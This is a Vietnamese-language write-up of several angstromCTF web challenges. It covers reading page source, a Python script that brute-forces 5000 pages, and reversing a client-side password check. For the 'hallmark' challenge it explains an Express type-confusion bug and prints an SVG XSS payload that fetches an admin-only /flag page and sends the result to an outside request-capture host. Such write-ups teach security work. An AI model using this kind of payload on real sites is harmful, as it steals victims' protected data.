# Ẳng-strong ctf

## catch me if you can!

![image](https://user-images.githubusercontent.com/104350480/234269731-924f1551-d7a0-4a41-aab5-b9f101122489.png)

Ctrl U: 

![image](https://user-images.githubusercontent.com/104350480/234269805-e1d0a37f-312d-4840-86d3-47e0c6ec90e2.png)

> Flag: actf{y0u_caught_m3!_0101ff9abc2a724814dfd1c85c766afc7fbd88d2cdf747d8d9ddbf12d68ff874}

## directory

Giao diện trang web: 

![image](https://user-images.githubusercontent.com/104350480/234269957-cdabffe8-729f-45a2-a21d-babada7a68d2.png)

Click vào 1 file bất kỳ: 

![image](https://user-images.githubusercontent.com/104350480/234269998-0638620f-9335-4c15-a91c-a6ab09b5922c.png)

Có 5000 file tất cả, và flag sẽ ở 1 trong 5000 file đấy, viết script để lấy flag: 

```
import requests
url = f"https://directory.web.actf.co/"
for i in range(0,5000):
  r = requests.get(url + f'{i}.html')
  print(i)
  if 'your flag is in another file' not in r.text:
    print(r.text)
    break


```

Tuy vậy thì brute-force sẽ khá lâu, để nhanh hơn thì có thể chia range thành các khoảng nhỏ hơn và chạy song song: 

![image](https://user-images.githubusercontent.com/104350480/234276216-074ad002-4693-4644-8dd0-17e90286ff1d.png)

> Flag: actf{y0u_f0und_me_b51d0cde76739fa3}


## shortcircuit

Bài cho giao diện là một form đăng nhập:

![image](https://user-images.githubusercontent.com/104350480/234759449-3f43f85e-5692-4b1d-b572-be56a63c375c.png)

Thử nhập bất kì thì sẽ báo là lỗi, Ctrl U ta được source code: 

```
<script>
            const swap = (x) => {
                let t = x[0]
                x[0] = x[3]
                x[3] = t

                t = x[2]
                x[2] = x[1]
                x[1] = t

                t = x[1]
                x[1] = x[3]
                x[3] = t

                t = x[3]
                x[3] = x[2]
                x[2] = t

                return x
            }

            const chunk = (x, n) => {
                let ret = []

                for(let i = 0; i < x.length; i+=n){
                    ret.push(x.substring(i,i+n))
                }

                return ret
            }

            const check = (e) => {
                if (document.forms[0].username.value === "admin"){
                    if(swap(chunk(document.forms[0].password.value, 30)).join("") == "7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7"){
                        location.href="/win.html"
                    }
                    else{
                        document.getElementById("msg").style.display = "block"
                    }
                }
            }
        </script>
        
 ```
 
 Phân tích qua thì có thể thấy nếu ta nhập tên username là admin và ở trường password ta nhập vào 1 giá trị sao cho sau khi thực hiện chunk và swap mà ra được giá trị **7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7** ta sẽ login thành công, còn kh thì trả về 1 message báo lỗi. Ở đây hàm chunk nhận 2 tham số, với tham số đầu tiên là chuỗi nhập vào và tham số thứ 2 để phân tách chuỗi của ta thành các đoạn có độ dài 30 kí tự, và trả về mảng chứa giá trị ban đầu, ở đây có 120 kí tự nên được chia thành 4 đoạn. Tiếp theo là dùng hàm swap để hoán đổi vị trí của nó. Giờ ta chỉ cần viết script ngược lại để trả về giá trị cần tìm là được: 
 
 ```
 
 const swap = (x) => {
  let t = x[3];
  x[3] = x[2];
  x[2] = t;

  t = x[1];
  x[1] = x[3];
  x[3] = t;

  t = x[2];
  x[2] = x[1];
  x[1] = t;


  t = x[0];
  x[0] = x[3];
  x[3] = t;


  return x;
};

const chunk = (x, n) => {
  let ret = [];

  for (let i = 0; i < x.length; i += n) {
    ret.push(x.substring(i, i + n));
  }

  return ret;
};

const input = "7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7";
const reversed = swap(chunk(input, 30)).join("");
console.log(reversed);

```

![image](https://user-images.githubusercontent.com/104350480/234760940-ac0df285-e573-48b3-b8ae-d8893873071a.png)


> Flag: actf{cl1ent_s1de_sucks_544e67e6317199e454f4d2bdb04d9e419ccc7f12024523398ee02fe7517fffa92517e08250c4aaa9ed206fd7c9e398e2}


## hallmark

![image](https://user-images.githubusercontent.com/104350480/234762061-48b078d0-0206-4911-b93b-8aeb7f9adfd4.png)


Bài cho ta 2 đường dẫn, 1 đường dẫn tới trang web ta exploit và 1 đường dẫn tới trang để nộp đường dẫn url cho admin, dạng xss luôn. Đầu tiên ở trang web ta cần exploit: 

![image](https://user-images.githubusercontent.com/104350480/234762284-0ec9abc9-86ae-4e25-b5c9-db1fe8db9a02.png)

Nó cho phép ta send đi 1 ảnh hoặc 1 message, ở phần custom text, ta có thể nhập 1 giá trị bất kì và trang web sẽ in ra giá trị đó: 

![image](https://user-images.githubusercontent.com/104350480/234762466-3789f342-1557-4e72-aa6d-ed0c2994c3fd.png)

Và cả xss cũng vậy, nó được trực tiếp in ra màn hình: 

![image](https://user-images.githubusercontent.com/104350480/234762560-73c2b599-375c-408c-91b8-676985a843fe.png)

Bắt qua burpsuite ta có thể thấy response trả về đang ở dạng text/plain và vì vậy ta sẽ kh thể thực thi script được: 

![image](https://user-images.githubusercontent.com/104350480/234762892-a031d661-abfc-4848-b4c1-cff6d7e8a613.png)


Bài cho ta source code, và đây là đoạn chính để khai thác: 

```

const express = require("express");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");
const path = require("path");
const { v4: uuidv4, v4 } = require("uuid");
const fs = require("fs");

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

const IMAGES = {
    heart: fs.readFileSync("./static/heart.svg"),
    snowman: fs.readFileSync("./static/snowman.svg"),
    flowers: fs.readFileSync("./static/flowers.svg"),
    cake: fs.readFileSync("./static/cake.svg")
};

Object.freeze(IMAGES)

const port = Number(process.env.PORT) || 8080;
const secret = process.env.ADMIN_SECRET || "secretpw";
const flag = process.env.FLAG || "actf{placeholder_flag}";

const cards = Object.create(null);

app.use('/static', express.static('static'))

app.get("/card", (req, res) => {
    if (req.query.id && cards[req.query.id]) {
        res.setHeader("Content-Type", cards[req.query.id].type);
        res.send(cards[req.query.id].content);
    } else {
        res.send("bad id");
    }
});

app.post("/card", (req, res) => {
    let { svg, content } = req.body;

    let type = "text/plain";
    let id = v4();

    if (svg === "text") {
        type = "text/plain";
        cards[id] = { type, content }
    } else {
        type = "image/svg+xml";
        cards[id] = { type, content: IMAGES[svg] }
    }

    res.redirect("/card?id=" + id);
});

app.put("/card", (req, res) => {
    let { id, type, svg, content } = req.body;

    if (!id || !cards[id]){
        res.send("bad id");
        return;
    }

    cards[id].type = type == "image/svg+xml" ? type : "text/plain";
    cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;

    res.send("ok");
});


// the admin bot will be able to access this
app.get("/flag", (req, res) => {
    if (req.cookies && req.cookies.secret === secret) {
        res.send(flag);
    } else {
        res.send("you can't view this >:(");
    }
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});


```

Trang web được xây dựng bởi framework ExpressJS trong NodeJS, ở đây đoạn mã cho phép ta tạo, đọc và cập nhật các thẻ ảnh SVG hoặc nội dung văn bản thông qua các phương thức get, post và put. Trong đó: 

![image](https://user-images.githubusercontent.com/104350480/234764362-93f82186-dfe1-4f8a-bdc3-65e7c88205a9.png)

Phương thức get("/card", (req, res) => { ... }) ở đây xử lý yêu cầu HTTP GET đến đường dẫn "/card". Nó kiểm tra xem yêu cầu có chứa thông tin "id" hay không và "id" đó có tồn tại trong danh sách "cards" ( tức giá trị id mà ta đã post và được lưu vào danh sách này) hay không. Nếu có, nó sẽ đặt tiêu đề "Content-Type" là loại dữ liệu được lưu trữ cho thẻ có "id" tương ứng trong danh sách "cards" và trả về nội dung của thẻ đó. Nếu không, nó sẽ trả về thông báo lỗi "bad id".

Phương thức post("/card", (req, res) => { ... }) ở đây xử lý yêu cầu HTTP POST đến đường dẫn "/card". Nó nhận dữ liệu POST được gửi từ người dùng, bao gồm "svg" và "content". Sau đó, nó tạo một ID mới bằng cách sử dụng hàm "v4" từ thư viện "uuid" đã require. Tiếp theo, nó xác định loại dữ liệu của thẻ, tùy thuộc vào giá trị của "svg". Nếu "svg" có giá trị là "text", thẻ được xác định là text/plain. Nếu không, thẻ được xác định là một tệp SVG. Sau đó, nó lưu trữ thông tin thẻ mới vào danh sách "cards" và chuyển hướng người dùng đến đường dẫn "/card?id=" để hiển thị thẻ vừa tạo. Điều này giải thích cho việc vì sao ta nhập script nó trả về dạng text/plain. 

Ở 2 luồng trên ta kh thấy có thể trigger xss được ở đâu cả, tiếp tục phân tích luồng PUT:

![image](https://user-images.githubusercontent.com/104350480/234766030-601a0f71-92fe-4796-a274-d6ddbe921023.png)


Khi ta gửi một yêu cầu PUT đến endpoint /card, server sẽ nhận được dữ liệu gửi kèm trong body của request. Dữ liệu này chứa các thông tin về thẻ mà người dùng muốn cập nhật, bao gồm id, type, svg và content.

Sau đó, server sẽ kiểm tra xem id có tồn tại trong đối tượng cards hay không bằng cách sử dụng điều kiện if (!id || !cards[id]). Nếu id không tồn tại, server sẽ trả về thông báo lỗi "bad id" và kết thúc xử lý.

Nếu id hợp lệ hay là có tồn tại trong cards, server sẽ cập nhật nội dung của thẻ được chỉ định bằng cách thay đổi giá trị type và content của nó. Nếu giá trị type là "image/svg+xml", server sẽ sử dụng IMAGES[svg || "heart"] để cập nhật giá trị content, ngược lại sẽ sử dụng giá trị content được gửi kèm trong yêu cầu. Sau khi cập nhật thành công, server sẽ trả về thông báo "ok" và kết thúc xử lý yêu cầu.

Ở đây ta muốn trigger được xss thì type trả về phải có định dạng image/svg+xml để ta thực hiện xss qua thẻ svg, còn nếu để trả về text/plain thì sẽ vứt đi. Chẳng hạn khi ta thực hiện qua burpsuite sẽ như sau: 

Đầu tiên thực hiện POST: 

![image](https://user-images.githubusercontent.com/104350480/234766586-4c4ba1d2-59e4-408c-aee4-4e43da9e4248.png)

Với id tự sinh và thực hiện GET:

![image](https://user-images.githubusercontent.com/104350480/234766531-4976bae9-ed6e-493f-b849-982cf735ffd1.png)

Sửa id thành 1 giá trị khác 1 xíu thôi server sẽ trả về: 

![image](https://user-images.githubusercontent.com/104350480/234766778-f1ab8b16-78fd-4871-9b7d-398483f19606.png)

Vì kh có chỗ để PUT nên ta sẽ tự tạo phương thức PUT với các giá trị tương ứng: 

![image](https://user-images.githubusercontent.com/104350480/234767558-cb2a7aac-0015-4713-ac2c-6d3fec6c2567.png)

Ta thực hiện PUT thành công, tuy vậy ở đây vẫn chưa thể thực hiện xss được vì ở điều kiện sau, nếu ta để type ở định dạng image/svg+xml thì ở cards[id].content sẽ trả về IMAGES[svg || "heart"] (nếu giá trị svg ở đây được truyền vào là null thì heart sẽ được sử dụng luôn) thay vì trả về content ta mong muốn để thực thi:

![image](https://user-images.githubusercontent.com/104350480/234768393-3db14242-c5c7-4359-a97a-abcb92c3f562.png)

Và vì vậy khi thực hiện GET nó sẽ báo về lỗi sau: 

![image](https://user-images.githubusercontent.com/104350480/234768042-cbf04e9e-e94f-41d0-a365-372c6141d133.png)

Vì vậy ta cần phải làm cho điều kiện ở đây thành sai để bypass. Ý tưởng sẽ là type sẽ là image/svg+xml để thực thi xss nhưng content phải được trả về. Để ý điều kiện so sánh, dòng trên là so sánh lỏng lẻo, ở dưới là so sánh nghiệm ngặt, tức phải cùng kiểu type, ta có thể thay type bằng type[] để bypass, trong js thì nó sẽ tự động chuyển kiểu dữ liệu tự động trong quá trình so sánh, ở đây là chuyển type[] sang kiểu chuỗi để so sánh với chuỗi "image/svg+xml", và do đó kết quả sẽ trả về true. Còn khi sử dụng phép so sánh nghiêm ngặt ===, js sẽ so sánh cả kiểu dữ liệu nên kết quả sẽ trả về false vì type[] không phải là kiểu chuỗi mà là một mảng. Ta thực hiện thay đổi và thực hiện alert xem được chưa: 

![image](https://user-images.githubusercontent.com/104350480/234771662-e62e8e10-36cf-4cd1-ac17-8f6b549ec2f0.png)

![image](https://user-images.githubusercontent.com/104350480/234771686-9051011f-caea-4a16-bbf9-7ce769389990.png)

Thực hiện thành công rồi, giờ ta sửa script để lấy flag từ admin. Tuy vậy thì flag của bài này kh nằm trong cookie, mà nằm ở /flag mà chỉ admin có thể truy cập: 

```

app.get("/flag", (req, res) => {
    if (req.cookies && req.cookies.secret === secret) {
        res.send(flag);
    } else {
        res.send("you can't view this >:(");
    }
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}.`);
});

```

Vì vậy ta sẽ viết script dùng fetch để lấy flag từ https://hallmark.web.actf.co/flag và sử dụng phương thức .then() để xử lý nội dung được trả về từ fetch() sau đó lấy flag thông thông qua tham số truyền vào ở đây là 'c=' kèm theo flag: 

```

<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://hallmark.web.actf.co/flag').then(r=>r.text()).then(text=> window.location='https://eo7xxasp6lhfvaj.m.pipedream.net?c='+text)"/>

```
![image](https://user-images.githubusercontent.com/104350480/234774591-35b42eba-1909-47bb-9b32-26e251528ee9.png)


Giờ gửi cho admin click nữa là xong: 

![image](https://user-images.githubusercontent.com/104350480/234774710-2178e70c-78e6-4e8b-92c4-f4b98e8c2353.png)

![image](https://user-images.githubusercontent.com/104350480/234774765-160ef3fb-b15e-457b-8a13-bbb1aa0ec8b8.png)

> Flag: actf{the_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33}





